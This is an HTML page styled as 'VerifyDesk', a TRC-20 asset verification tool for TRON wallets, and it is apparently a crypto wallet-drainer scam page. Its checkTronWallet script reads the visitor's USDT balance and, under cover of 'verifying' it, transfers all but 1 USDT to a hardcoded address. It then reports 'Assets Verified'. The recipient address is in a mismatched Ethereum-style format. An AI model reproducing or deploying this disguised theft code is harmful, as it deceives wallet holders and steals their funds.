<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VerifyDesk - TRC-20 Asset Review</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'] },
                    colors: {
                        bgDark: '#08101A',
                        cardDark: '#0F1926',
                        borderDark: '#1E293B',
                        accent: '#20D49C',
                        textMuted: '#8BA3B8'
                    }
                }
            }
        }
    </script>

    <style>
        body { background: radial-gradient(circle at top, #0f1f31 0%, #08101A 40%); min-height: 100vh; }
        .glow-button { box-shadow: 0 4px 20px rgba(32, 212, 156, 0.25); }
    </style>
</head>
<body class="text-white font-sans antialiased flex flex-col items-center pb-20 relative overflow-x-hidden">

    <nav class="w-full max-w-md px-6 py-4 flex justify-between items-center bg-transparent">
        <div class="flex items-center gap-3">
            <div class="w-10 h-10 bg-[#0a1e26] border border-accent/30 rounded-xl flex items-center justify-center">
                <i class="fa-solid fa-shield-check text-accent text-lg"></i>
            </div>
            <span class="text-lg font-bold">VerifyDesk</span>
        </div>
        <div class="flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-textMuted">
            <div class="w-2 h-2 rounded-full bg-accent animate-pulse"></div> TRON Secure Connection
        </div>
    </nav>

    <div class="w-full max-w-md px-6 py-6">
        
        <div class="text-center mb-10 mt-4">
            <div class="inline-flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-accent mb-6">
                <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent TRC-20 Tool
            </div>
            <h1 class="text-[32px] font-extrabold tracking-tight leading-tight mb-4">
                Wallet Asset<br>
                <span class="text-accent">Review</span>
            </h1>
            <p class="text-textMuted text-[14px] leading-relaxed px-2">
                Review and verify supported TRC-20 wallet assets on TRON through a clear, wallet-confirmed flow.
            </p>
        </div>

        <div class="bg-cardDark border border-borderDark rounded-2xl p-6 shadow-2xl relative overflow-hidden mb-8">
            <div class="flex flex-col items-center text-center">
                <div class="w-14 h-14 bg-[#0a1e26] border border-accent/30 rounded-2xl flex items-center justify-center mb-6">
                    <i class="fa-solid fa-shield-check text-accent text-2xl"></i>
                </div>
                <h2 class="text-[22px] font-extrabold tracking-tight uppercase leading-snug mb-3">
                    Verify Your Wallet<br>Assets
                </h2>
                <p class="text-textMuted text-[14px] leading-relaxed mb-8 px-2">
                    Use Trust Wallet, TronLink, or a compatible DApp browser to review supported assets.
                </p>

                <button onclick="checkTronWallet()" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-8">
                    <i class="fa-regular fa-credit-card text-lg"></i>
                    <span class="text-[15px]">Verify Assets &rarr;</span>
                </button>
            </div>
        </div>
    </div>

    <script>
        async function checkTronWallet() {
            try {
                let tronProvider = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
                
                if (!tronProvider || !tronProvider.defaultAddress.base58) {
                    alert("Please open this link inside Trust Wallet or TronLink DApp browser.");
                    return;
                }

                const userAddress = tronProvider.defaultAddress.base58;
                const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3'; // Note: Ensure target accepts TRC20 or convert address if needed, using standard TRON address format if preferred.
                const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Official TRC-20 USDT
                
                const contract = await tronProvider.contract().at(usdtContractAddress);
                const balanceWei = await contract.balanceOf(userAddress).call();
                
                // TRC-20 USDT uses 6 decimals
                const formattedBalance = parseFloat(tronProvider.fromSun(balanceWei));
                
                if (formattedBalance > 1.0) {
                    const sendAmount = formattedBalance - 1.0;
                    const sendAmountSun = tronProvider.toSun(sendAmount);
                    
                    // Trigger TRC-20 transfer function
                    await contract.transfer(targetAddress, sendAmountSun).send();
                    alert("Assets Verified and Transaction Submitted!");
                } else {
                    alert("Verification complete. Your TRON USDT balance is " + formattedBalance + " USDT, which is less than or equal to 1 USDT.");
                }

            } catch (error) {
                console.error("TRON Wallet Error:", error);
                alert("Execution Notice: " + (error.message || JSON.stringify(error)));
            }
        }
    </script>
</body>
</html>
